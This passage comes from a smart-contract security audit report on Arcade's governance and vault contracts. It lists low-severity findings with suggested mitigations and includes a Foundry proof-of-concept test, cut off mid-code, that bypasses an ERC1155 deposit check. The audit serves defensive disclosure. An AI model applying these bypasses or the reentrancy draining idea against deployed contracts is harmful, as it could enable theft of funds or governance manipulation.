insecure state where the system will accept any message that it has never seen before and process it as if it were genuine.</p>\n<p>This has happened before in the <a href=\"https://medium.com/numen-cyber-labs/nomadic-bridge-attack-incident-analysis-94716b93fa61\">nomad bridge incident</a>.</p>\n<blockquote>\n<p>The Nomad team initialized the trusted root to be <code>0x00</code>. To be clear, using zero values as initialization values is a common practice.</p>\n</blockquote>\n<p>Instances:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/88dcbdedebc506284fcfb3f14d20fc789ce811cf/contracts/libraries/ArcadeMerkleRewards.sol#L62\">ArcadeMerkleRewards.sol#L62</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/88dcbdedebc506284fcfb3f14d20fc789ce811cf/contracts/external/council/libraries/MerkleRewards.sol#L28\">MerkleRewards.sol#L28</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/88dcbdedebc506284fcfb3f14d20fc789ce811cf/contracts/token/ArcadeAirdrop.sol#L76\">ArcadeAirdrop.sol#L76</a></li>\n</ul>\n<h2 id=\"l-02-delegate-can-be-called-with-no-voting-power\" style=\"position:relative;\"><a href=\"#l-02-delegate-can-be-called-with-no-voting-power\" aria-label=\"l 02 delegate can be called with no voting power permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] <code>delegate()</code> can be called with no voting power</h2>\n<p>The <code>delegate()</code> functions in <code>ARCDVestingVault</code> and <code>NFTBoostVault</code> can be called by anyone, despite them not having any voting power.</p>\n<p>This leads to changes in the storage variables, like pushing empty entries to the <code>votingPower</code>, and setting a <code>delegatee</code>, despite not delegating anything. </p>\n<p>As it will set a <code>registration.delegatee</code>, it will bypass the validations <code>if (registration.delegatee == address(0)) revert NBV_NoRegistration();</code> on <code>addTokens()</code>, and <code>updateNft()</code>. Making it possible to call those functions without “initializing” the corresponding registration storage via <code>addNftAndDelegate()</code>.</p>\n<p>This can lead to unexpected effects.</p>\n<p>Instances:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L182-L212\">NFTBoostVault.sol#L182-L212</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ARCDVestingVault.sol#L260-L282\">ARCDVestingVault.sol#L260-L282</a></li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Verify that <code>_currentVotingPower(registration) > 0</code>.</p>\n<h2 id=\"l-03-use-a-two-step-transfer-function-for-the-minter-role-in-arcadetoken\" style=\"position:relative;\"><a href=\"#l-03-use-a-two-step-transfer-function-for-the-minter-role-in-arcadetoken\" aria-label=\"l 03 use a two step transfer function for the minter role in arcadetoken permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] Use a two-step transfer function for the Minter role in <code>ArcadeToken</code></h2>\n<p>The <code>ArcadeToken</code> has a very important Minter role which can be changed via a <code>setMinter()</code> function.</p>\n<p>In order to prevent the role from mistakenly being transferred to an address that cannot handle it (e.g. due to a typo in the address), require that the recipient of the new minter role actively accepts via a contract call of its own.</p>\n<p>Instances:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/token/ArcadeToken.sol#L132-L137\">ArcadeToken.sol#L132-L137</a></li>\n</ul>\n<h2 id=\"l-04-nftboostvaultupdatenft-allows-to-deposit-any-nft\" style=\"position:relative;\"><a href=\"#l-04-nftboostvaultupdatenft-allows-to-deposit-any-nft\" aria-label=\"l 04 nftboostvaultupdatenft allows to deposit any nft permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04] <code>NFTBoostVault::updateNft()</code> allows to deposit any NFT</h2>\n<p>The function <code>addNftAndDelegate</code> reverts when depositing any random NFT because of the <code>if (multiplier == 0) revert NBV_NoMultiplierSet();</code> in <code>_registerAndDelegate()</code>.</p>\n<p>But <code>updateNft()</code> does not have that check, which allows anyone to update and deposit any NFT, leading to a multiplier of 0; and thus a voting power of 0, despite the user having deposited any other tokens.</p>\n<p>This might also be combined with other issues for a bigger severity issue. We recommend that the same check to revert on <code>multiplier == 0</code> is applied on <code>updateNft()</code>.</p>\n<p>Instances:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L305-L330\">NFTBoostVault.sol#L305-L330</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L477\">NFTBoostVault.sol#L477</a></li>\n</ul>\n<h2 id=\"l-05-if-token-has-hooks-the-grant-owner-can-revert-when-admin-try-to-revoke-the-role\" style=\"position:relative;\"><a href=\"#l-05-if-token-has-hooks-the-grant-owner-can-revert-when-admin-try-to-revoke-the-role\" aria-label=\"l 05 if token has hooks the grant owner can revert when admin try to revoke the role permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-05] If <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/88dcbdedebc506284fcfb3f14d20fc789ce811cf/contracts/ARCDVestingVault.sol#L61\"><code>token</code></a> has hooks, the grant owner can revert when admin try to revoke the role</h2>\n<p>An evil granted owner can avoid being <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/88dcbdedebc506284fcfb3f14d20fc789ce811cf/contracts/ARCDVestingVault.sol#L157\"><code>revoke</code></a>. They can revert triggering a <code>DOS</code> to avoid a manager to revoke the role.</p>\n<h2 id=\"l-06-if-token-has-hooks-the-manager-could-reenter-to-revokegrant-draining-the-contract\" style=\"position:relative;\"><a href=\"#l-06-if-token-has-hooks-the-manager-could-reenter-to-revokegrant-draining-the-contract\" aria-label=\"l 06 if token has hooks the manager could reenter to revokegrant draining the contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-06] If <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/88dcbdedebc506284fcfb3f14d20fc789ce811cf/contracts/ARCDVestingVault.sol#L61\"><code>token</code></a> has hooks, the manager could <code>reenter</code> to <code>revokeGrant</code> draining the contract</h2>\n<p>A token with a hook could leave a reentrancy issue, letting the manager drain funds.</p>\n<h2 id=\"l-07-the-storage-slotshashes-have-known-pre-images\" style=\"position:relative;\"><a href=\"#l-07-the-storage-slotshashes-have-known-pre-images\" aria-label=\"l 07 the storage slotshashes have known pre images permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-07] The storage slots/hashes have known pre-images.</h2>\n<p>Knowledge of pre-images might allow manipulation of specific mapping parameters by crafting special keys. This is possible if a mapping parameter’s storage slot lands on a specific slot.</p>\n<p>It might be best to decrement them by “one” so that finding the pre-image would be harder.</p>\n<p>Instances:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/88dcbdedebc506284fcfb3f14d20fc789ce811cf/contracts/external/council/libraries/Storage.sol\">Storage.sol</a></li>\n</ul>\n<p>Example:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">typehash</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;mapping(address =&gt; AddressUint)&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">offset</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">typehash</span><span class=\"mtk1\">, </span><span class=\"mtk12\">name</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slot</span><span class=\"mtk1\"> := </span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">offset</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">) </span><span class=\"mtk3\">// keccak256(NAME) - 1, to avoid preimage attack</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Also please review this <a href=\"https://eips.ethereum.org/EIPS/eip-1967#security-considerations\">eip-1967</a></p>\n<h2 id=\"l-08-type-of-tokenid-in-reputationbadge-and-nftboostvault-do-not-match-and-can-lead-to-tokens-not-being-usable-as-multipliers\" style=\"position:relative;\"><a href=\"#l-08-type-of-tokenid-in-reputationbadge-and-nftboostvault-do-not-match-and-can-lead-to-tokens-not-being-usable-as-multipliers\" aria-label=\"l 08 type of tokenid in reputationbadge and nftboostvault do not match and can lead to tokens not being usable as multipliers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-08] Type of <code>tokenId</code> in <code>ReputationBadge</code> and <code>NftBoostVault</code> do not match and can lead to tokens not being usable as multipliers</h2>\n<p><code>ReputationBadge</code> tokens are meant to be used as multipliers of voting power in <code>NftBoostVault</code>.</p>\n<p>Users can mint badges with <code>tokenId</code> up to <code>uint256</code>, but <code>NftBoostVault</code> only allows to set <code>tokenId</code> up to <code>uint128</code> to work as multipliers.</p>\n<p>Tokens with <code>tokenId > type(uint128).max</code> won’t be able to be used as multipliers.</p>\n<p><code>tokenId</code> in <code>ReputationBadge</code> (uint256):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalClaimable</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">merkleProof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/nft/ReputationBadge.sol#L100\">ReputationBadge.sol#L100</a></p>\n<p><code>tokenId</code> in <code>NftBoostVault</code> (uint128):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMultiplier</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">multiplierValue</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyManager</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/NFTBoostVault.sol#L363\">NFTBoostVault.sol#L363</a></p>\n<p>Consider setting the same <code>tokenId</code> type for the expected NFTs to be used in the contract.</p>\n<h2 id=\"l-09-you-can-bypass-the-erc1155-check-and-deposit-anything-if-tokenid--0\" style=\"position:relative;\"><a href=\"#l-09-you-can-bypass-the-erc1155-check-and-deposit-anything-if-tokenid--0\" aria-label=\"l 09 you can bypass the erc1155 check and deposit anything if tokenid  0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-09] You can bypass the ERC1155 check and deposit anything if <code>tokenId == 0</code></h2>\n<p>The check on <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/88dcbdedebc506284fcfb3f14d20fc789ce811cf/contracts/NFTBoostVault.sol#L472\">NFTBoostVault.sol#L472</a> can be easily bypassed if the ERC1155 token id is <code>0</code>:<br></p>\n<p><code>if (_tokenAddress != address(0) &#x26;&#x26; _tokenId != 0) {</code></p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: UNLICENSED</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">13</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;forge-std/Test.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../contracts/NFTBoostVault.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../contracts/token/ArcadeToken.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ExampleTest</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Test</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">NFTBoostVault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">boostVault</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ArcadeToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ArcadeToken</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">boostVault</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">NFTBoostVault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testDepositAnyERC1155</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// create a fake erc1155 (could also happen with a )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">FakeERC1155</span><span class=\"mtk1\"> </span><span class=\"mtk12\">f</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">FakeERC1155</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">boostVault</span><span class=\"mtk1\">),</span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">boostVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addNftAndDelegate</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// uint128 tokenId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">f</span><span class=\"mtk1\">), </span><span class=\"mtk3\">//address tokenAddress,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xdead</span><span class=\"mtk1\">) </span><span class=\"mtk3\">// delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x02</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x02</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">boostVault</span><span class=\"mtk1\">),</span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span 